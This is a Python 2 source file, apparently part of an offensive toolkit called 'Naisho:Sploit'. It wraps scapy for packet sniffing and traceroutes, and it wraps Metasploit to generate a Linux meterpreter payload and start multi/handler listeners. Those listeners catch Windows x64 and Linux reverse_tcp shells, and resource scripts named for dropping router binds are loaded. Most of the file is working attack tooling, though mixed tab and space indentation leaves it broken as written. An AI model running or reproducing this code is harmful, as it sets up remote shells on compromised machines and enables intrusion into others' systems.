#!/usr/bin/python

class naishomisc:
	def __init__(self):
		self.hostname = ""
		self.port = ""
	def naishosniff(self):
		import pexpect
		import time
		child = pexpect.spawn ("scapy")
    		child.sendline('sniff(filter="", count=30)')
		time.sleep(40)
		
		child.sendline('a=_')
		child.sendline('a.nsummary()')
		child.interact()
	def naishotraceroute(self):
                import pexpect
                import time
		self.hostname = raw_input("Please input Hostname(s):\n *eg: 192.168.1.1,10.1.1.1\n\n: ")
                self.port = raw_input("Please input Port(s):\n *eg: 8080,80,445,3389\n\n: ")
		child = pexpect.spawn ("scapy")
                child.sendline('res,unans = traceroute([' + self.hostname + '],dport=[' + self.port + '],maxttl=20,retry=-2)')
                time.sleep(20)
                child.sendline('res.graph()')
                child.interact()
	def naishoroutershellpayload(self):
		import pexpect
		import time
		import subprocess
		choice = raw_input("[1] Windows x64 Listener\n[2] Linux x64\n\nNaisho:Sploit> ")
		hostip = raw_input("Local IP Address: ")
		hostport = raw_input("Listener port: ") 
		if choice == str(1):
		
			exploit = "multi/handler"
			#payload = "windows/meterpreter/reverse_tcp"
			payload = "windows/x64/meterpreter/reverse_tcp"
			rhost = ""
			lport = "8080"
			
			child = pexpect.spawn("msfcli %s payload=%s lhost=%s lport=%s E" % (exploit,payload,hostip,hostport))
			child.sendline ("resource resource/dropNaishoRouterBind.rc")
			child.interact()	

		elif choice == str(2):
			exploit = "multi/handler"
			payload = "linux/x86/meterpreter/reverse_tcp"
			lport = "8080"
			
			#Create Payload for Demo:
			subprocess.Popen("msfpayload %s lport=%s X > payloads/linux_payload" % (payload, lport), shell=True).wait()
			
			child = pexpect.spawn("msfcli %s payload=%s lhost=%s lport=%s E" % (exploit,payload,hostip,hostport))
			child.sendline ("resource resource/demodrop.rc")
			child.interact()
